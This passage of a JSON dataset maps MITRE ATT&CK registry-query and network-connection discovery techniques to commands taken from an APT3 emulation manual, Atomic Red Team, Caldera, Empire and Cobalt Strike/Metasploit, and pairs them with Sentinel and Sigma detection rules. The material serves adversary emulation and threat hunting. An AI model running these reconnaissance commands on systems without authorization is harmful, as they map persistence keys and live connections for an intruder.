line\n\u00a0\u00a0\u00a0\u00a0condition: selection1 OR selection2 OR selection3 OR selection4\nlevel: medium", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1012", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections ", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "reg queryval -k \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" -v fDenyTSConnections\npost/windows/gather/enum_termserv", "name": "Metasploit"}, {"source": "atomics/T1012/T1012.yaml", "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n", "name": null}, {"source": "data/abilities/discovery/2488245e-bcbd-405d-920e-2de27db882b3.yml", "command": {"windows": {"psh": {"command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"}}}, "name": "Query Registry using PowerShell Get-ItemProperty"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "name": "registry_path"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_cached_rdpconnection", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_cached_rdpconnection", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Users \\ Administrator> reg query \"HKEY_CURRENT_USER \\ Software \\ Microsoft \\ Terminal Server Client \\ Default\" / ve\nError: The system can not find the specified registry key or value.", "name": "Dos"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1012", "Built-in Windows Command": "reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections ", "Cobalt Strike": "shell reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections", "Metasploit": "reg queryval -k \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" -v fDenyTSConnections\npost/windows/gather/enum_termserv", "Description": "Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled"}}, {"Atomic Red Team Test - Query Registry": {"attack_technique": "T1012", "display_name": "Query Registry", "atomic_tests": [{"name": "Query Registry", "description": "Query Windows Registry.\n\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\n\nReferences:\n\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\n\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\n\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\n\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"}}]}}, {"Mitre Stockpile - Query Registry using PowerShell Get-ItemProperty": {"id": "2488245e-bcbd-405d-920e-2de27db882b3", "name": "Query Registry", "description": "Query Registry using PowerShell Get-ItemProperty", "tactic": "discovery", "technique": {"attack_id": "T1012", "name": "Query Registry"}, "platforms": {"windows": {"psh": {"command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"}}}}}, {"Threat Hunting Tables": {"chain_id": "100148", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100149", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100150", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100151", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100152", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100153", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100154", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100155", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100156", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100157", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100158", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100159", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100160", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100161", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100162", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100163", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100164", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg (query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "query_registry", "mitre_attack": "T1012", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_cached_rdpconnection", "ATT&CK Technique #1": "T1012", "ATT&CK Technique #2": "", "Technique": "Query Registry", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_cached_rdpconnection\":  [\"T1012\"],"}}], "command_list": ["reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections ", "shell reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections", "reg queryval -k \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" -v fDenyTSConnections\npost/windows/gather/enum_termserv", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n", {"windows": {"psh": {"command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"}}}, "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "powershell/situational_awareness/network/powerview/get_cached_rdpconnection", "powershell/situational_awareness/network/powerview/get_cached_rdpconnection", "Dos\nC: \\ Users \\ Administrator> reg query \"HKEY_CURRENT_USER \\ Software \\ Microsoft \\ Terminal Server Client \\ Default\" / ve\nError: The system can not find the specified registry key or value."], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 3 and process_path contains \"reg.exe\" and process_command_line contains \"reg query\"", "name": "Query Registry Network"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and process_path contains \"reg.exe\" and process_command_line contains \"reg query\"", "name": "Query Registry Process"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows executed locally reg query HKEY_CURRENT_USER \\ Software \\ Microsoft \\ Terminal Server Client \\ Default\ndescription: windows server 2016\nreferences: No\ntags: T1012\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ reg.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: reg query * / ve # Process Information> process command line, practice, you can detect any registry query behavior\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: low", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1049", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "netstat -ano[b] ", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell c:\\windows\\sysnative\\netstat.exe -ano[b]", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/gather/tcpnetstat", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net session | find / \"\\\\\"", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell net session | find / \"\\\\\"", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/gather/enum_logged_on_users", "name": "Metasploit"}, {"source": "atomics/T1049/T1049.yaml", "command": "netstat\nnet use\nnet sessions\n", "name": null}, {"source": "atomics/T1049/T1049.yaml", "command": "Get-NetTCPConnection\n", "name": null}, {"source": "atomics/T1049/T1049.yaml", "command": "netstat\nwho -a\n", "name": null}, {"source": "data/abilities/discovery/613e0ffb-e6e8-4e86-b35d-10edd232679d.yml", "command": {"windows": {"psh": {"command": "netstat -ano;\nGet-NetTCPConnection"}}}, "name": "Enumerates network connections"}, {"source": "data/abilities/discovery/638fb6bb-ba39-4285-93d1-7e4775b033a8.yml", "command": {"darwin": {"sh": {"command": "netstat -ant\n"}}, "linux": {"sh": {"command": "netstat -ant\n"}}, "windows": {"psh": {"command": "Get-NetTCPConnection\n"}}}, "name": "Find System Network Connections"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/monitortcpconnections", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/monitortcpconnections", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_rdp_session", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_rdp_session", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Users \\ Administrator> netstat\n\nActive connections\n\nProtocol local address external address status", "name": "Dos"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Users \\ Administrator> net use\nIt will record a new network connection.\n\nList is empty.", "name": "Dos"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Users \\ Administrator> net session\nList is empty.", "name": "Dos"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1049", "Built-in Windows Command": "netstat -ano[b] ", "Cobalt Strike": "shell c:\\windows\\sysnative\\netstat.exe -ano[b]", "Metasploit": "post/windows/gather/tcpnetstat", "Description": "Display current TCP/IP network connections (b requires elevated privs so you can see the process that opened the connection)"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1049", "Built-in Windows Command": "net session | find / \"\\\\\"", "Cobalt Strike": "shell net session | find / \"\\\\\"", "Metasploit": "post/windows/gather/enum_logged_on_users", "Description": "Display the list of active SMB sessions on the workstation so you can see which users have active connections."}}, {"Atomic Red Team Test - System Network Connections Discovery": {"attack_technique": "T1049", "display_name": "System Network Connections Discovery", "atomic_tests": [{"name": "System Network Connections Discovery", "description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "netstat\nnet use\nnet sessions\n"}}, {"name": "System Network Connections Discovery with PowerShell", "description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-NetTCPConnection\n"}}, {"name": "System Network Connections Discovery Linux & MacOS", "description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n", "supported_platforms": ["linux", "macos"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if netstat command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v netstat)\" ]; then exit 0; else exit 1;\n", "get_prereq_command": "echo \"Install netstat on the machine.\"; exit 1;\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "netstat\nwho -a\n"}}]}}, {"Mitre Stockpile - Enumerates network connections": {"id": "613e0ffb-e6e8-4e86-b35d-10edd232679d", "name": "System Network Connections Discovery", "description": "Enumerates network connections", "tactic": "discovery", "technique": {"attack_id": "T1049", "name": "System Network Connections Discovery"}, "platforms": {"windows": {"psh": {"command": "netstat -ano;\nGet-NetTCPConnection"}}}}}, {"Mitre Stockpile - Find System 